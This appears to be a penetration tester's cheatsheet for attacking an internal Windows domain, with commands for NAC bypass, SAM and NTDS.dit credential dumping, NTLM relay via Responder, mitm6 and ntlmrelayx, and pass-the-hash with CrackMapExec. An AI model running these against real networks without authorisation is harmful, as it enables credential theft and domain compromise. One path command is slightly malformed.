# Internal Penetration Testing

## 1. **No network access**

### Wi-Fi

* Crack WPA or crack/replay PEAP

> For more details, see next cheatsheet : [WiFi](02-wifi.md)

### NAC - MAC filtering

1. Spoof mac, static ip, gateway ip, from any authorized device \(e.g printer or voip phone\), and disconnect it: 
```sh
macchanger -r eth0
```
2. force your static IP to match the one that you spoofed the mac from : 
```sh
sudo ifconfig <static_ip>/24 && sudo ip route add default via <gateway_ip>
```

### NAC - 802.1X

* [Fenrir](https://github.com/Orange-Cyberdefense/fenrir-ocd) (IEEE 802.1X bypass)

---

## 2. **No account yet**

### Physical access

Boot from Kali Linux and dump creds

```bash
cd SystemRoot%\system32\Config\SAM
impacket-secretsdump -system SYSTEM -sam SAM -security SECURITY -local
```
> For more details, see next cheatsheet : [Windows Post Exploitation](05-post-exploitation-windows.md)

---

### Network Access

Port and service scan

nmap

```sh
nmap -Pn -n -sSUV -n -vvv --reason -pT:137-139,445,U:137-139 -oA SMB <hosts>
nmap --version-all -sV -sC -oA top1000 <hosts>
nmap --version-all -sV -sC -p- -oA allports <hosts>
```

Search for low hanging fruits \(MS17 / default password TOMCAT VNC ... \)

```bash
use auxiliary/scanner/smb/smb_ms17_010
use auxiliary/scanner/mssql/mssql_login
use auxiliary/scanner/http/tomcat_mgr_login
searchsploit <service_name>
```

---

Man-In-The-Middle

Responder + NTLMrelayx

1. First we need to edit  responder.conf like this :

`vim /usr/share/responder/Responder.conf`

```bash
[Responder Core]

; Servers to start
SQL = On
SMB = Off     # Turn this off
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = Off    # Turn this off
HTTPS = On
DNS = On
LDAP = On
```

2. Then we create a list of targets :

```bash
nmap -T4 -Pn -p 445 --open -oA <outfile> <targets>
cat *.gnmap | grep -i "open/tcp" | cut -d " " -f2 | sort -u > perim_up_smb.txt
cme smb perim_up_smb.txt --gen-relay-list relaylistOutputFilename.txt
```

> if the scope is small : `cme smb <targets> --gen-relay-list relaylistOutputFilename.txt`

3. After we can run Responder + ntlmrelayx

```bash
python Responder.py -I <interface> -rdw
ntlmrelayx.py -tf relaylistOutputFilename.txt

# If no hash, try all the responder arguments 
python Responder.py -I <interface> -rdPF
```

mitm6 + NTLMrelayx

```bash
sudo mitm6 -hw icorp-w10 -d internal.corp --ignore-nofqnd
ntlmrelayx.py -tf relaylistOutputFilename.txt -6 

# If no smb available, try ldap : 
ntlmrelayx.py -t ldaps://<DC> -l lootdir
```

ARP \(use with caution !\)

```bash
Bettercap
Cain.exe (& Abel)
```

---

## 3. **Unprivileged account only**

### Get a shell

> For more details, see next cheatsheets : [Shell](../useful-commands/shell.md) and [AV Bypass](09-antivirus-bypass)

---

### Local Privilege Escalation

> For more details, see next cheatsheet : [Local Privilege Escalation Windows](03-lpe-windows.md)

---

### Domain Escalation

> For more details, see next cheatsheet : [Domain Escalation](08-domain-escalation.md)

---

## 4. **Local Admin account**

### Post-Exploitation

> For more details, see next cheatsheet : [Local Post Exploitation Windows](05-post-exploitation-windows.md)

### Pivoting

> For more details, see next cheatsheet : [Pivoting](07-pivoting.md)

### Replay the secrets found

Kerberos ticket, LM/NTLM hash or cleartext password with CrackMapExec or lsassy

```bash
crackmapexec smb <host_file> -d <domain> -u <user>  -H <hash> --lsa
crackmapexec smb <host_file> -d <domain> -u <user>  -H <hash> --sam
lsassy <target> -d <domain> -u <user> -p <pass>
```

---

## 5. **Domain admin account**

### Dump NDTS.dit from DC

```bash
# CrackMapExec using password
sudo cme smb <target> -u <domain_admin> -p '<pass>' --ntds

# CrackMapExec using kerberos ticket
export KRB5CCNAME=<user>.ccache 
sudo cme smb <target> --kerberos --ntds
```